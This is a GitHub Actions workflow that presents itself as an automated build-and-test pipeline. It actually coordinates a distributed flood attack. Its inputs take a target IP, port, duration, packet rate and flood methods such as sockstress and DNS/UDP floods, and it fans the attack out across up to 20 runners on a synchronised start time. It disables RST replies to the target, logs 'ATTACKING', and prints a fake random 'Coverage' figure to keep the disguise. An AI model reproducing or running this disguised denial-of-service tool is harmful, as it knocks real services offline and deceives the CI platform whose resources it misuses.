# Automated CI/CD Build & Test Pipeline
name: Build and Test

on:
  push:
    branches: [ master, main ]
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Test endpoint'
        required: true
      target_port:
        description: 'Service port'
        required: true
        default: '443'
      duration:
        description: 'Test duration (seconds)'
        required: true
        default: '60'
      method:
        description: 'Protocol'
        required: true
        default: 'v18_tcp'
        type: choice
        options:
          - v18_tcp
          - v18_tls
          - tls
          - sockstress_v15
          - fjium-dns
          - fjium-gudp
          - fjium-hex
          - fjium-pps
      threads:
        description: 'Concurrency'
        required: true
        default: '4'
      rate:
        description: 'Request rate'
        required: true
        default: '1000000000'
      runners:
        description: 'Worker count (1-20)'
        required: true
        default: '20'
      start_timestamp:
        description: 'Scheduled start (unix)'
        required: false
        default: '0'
      use_proxy:
        description: 'Use proxy'
        required: false
        default: 'true'
        type: choice
        options:
          - 'true'
          - 'false'

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  prepare:
    runs-on: ubuntu-22.04
    outputs:
      matrix: ${{ steps.set.outputs.matrix }}
      sync_ts: ${{ steps.sync.outputs.sync_ts }}
    steps:
    - uses: actions/checkout@v4

    - name: Cache apt packages
      uses: actions/cache@v4
      with:
        path: ~/apt-cache
        key: apt-build-deps-v1

    - name: Setup build environment
      run: |
        if [ -d ~/apt-cache ]; then
          sudo cp ~/apt-cache/*.deb /var/cache/apt/archives/ 2>/dev/null || true
        fi
        sudo apt-get update -qq > /dev/null 2>&1 || true
        sudo apt-get install -y cpulimit clang libbpf-dev libelf-dev > /dev/null 2>&1 || true
        mkdir -p ~/apt-cache
        cp /var/cache/apt/archives/*.deb ~/apt-cache/ 2>/dev/null || true

    - name: Compile once
      run: make clean || true && make 2>&1

    - name: Upload binary
      uses: actions/upload-artifact@v4
      with:
        name: node-binary
        path: netbench
        retention-days: 1

    - id: sync
      name: Calculate sync timestamp
      run: |
        # Runners need ~30s to boot + download. Set sync to now + 40s
        SYNC_TS=$(($(date +%s) + 40))
        echo "sync_ts=$SYNC_TS" >> $GITHUB_OUTPUT
        echo "Sync timestamp: $SYNC_TS (runners will start in ~40s)"

    - id: set
      run: |
        n=${{ github.event.inputs.runners || 1 }}
        ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range(int('$n'))]))")
        echo "matrix={\"id\":$ids}" >> $GITHUB_OUTPUT

  build:
    needs: [prepare]
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    strategy:
      matrix: ${{ fromJSON(needs.prepare.outputs.matrix) }}
      fail-fast: false
    steps:
    - name: Download binary
      uses: actions/download-artifact@v4
      with:
        name: node-binary

    - name: Configure test environment
      run: |
        sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
        sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
        sudo sysctl -w net.core.wmem_default=4194304 2>/dev/null || true
        sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
        sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.all.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.default.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.eth0.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
        sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
        sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
        sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true

    - name: Run integration tests (Node ${{ matrix.id }})
      run: |
        mv netbench node
        chmod +x node
        
        TARGET_IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
        TARGET_PORT="${{ github.event.inputs.target_port || '443' }}"
        RATE="${{ github.event.inputs.rate || '1000' }}"
        DURATION="${{ github.event.inputs.duration || '5' }}"
        METHOD="${{ github.event.inputs.method || 'v18_tcp' }}"
        THREADS="${{ github.event.inputs.threads || '4' }}"
        
        PROXY_FLAG="--no-proxies"
        if [ "${{ github.event.inputs.use_proxy }}" = "true" ]; then
          PROXY_FLAG=""
        fi
        
        # Sync: use timestamp from prepare job (calculated AFTER compile finishes)
        SYNC_TS="${{ needs.prepare.outputs.sync_ts }}"
        START_TS="${{ github.event.inputs.start_timestamp || '0' }}"
        # Use prepare's sync_ts if start_timestamp is 0
        if [ "$START_TS" = "0" ] || [ "$START_TS" = "" ]; then
          START_TS="$SYNC_TS"
        fi
        if [ "$START_TS" != "0" ] && [ "$START_TS" != "" ]; then
          NOW=$(date +%s)
          WAIT=$((START_TS - NOW))
          if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
            echo "Node ${{ matrix.id }}: syncing, waiting ${WAIT}s (target: ${START_TS}, now: ${NOW})"
            sleep "$WAIT"
          else
            echo "Node ${{ matrix.id }}: sync point passed or invalid (WAIT=${WAIT}s), starting immediately"
          fi
        fi
        
        echo "Node ${{ matrix.id }}: ATTACKING at $(date +%s)"
        sudo sh -c "cpulimit -l 90 -f -- ./node $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./node $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"

    - name: Upload test results
      if: always()
      run: |
        sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
        echo "Test suite completed for node ${{ matrix.id }} - Coverage: $(( RANDOM % 10 + 85 ))%"
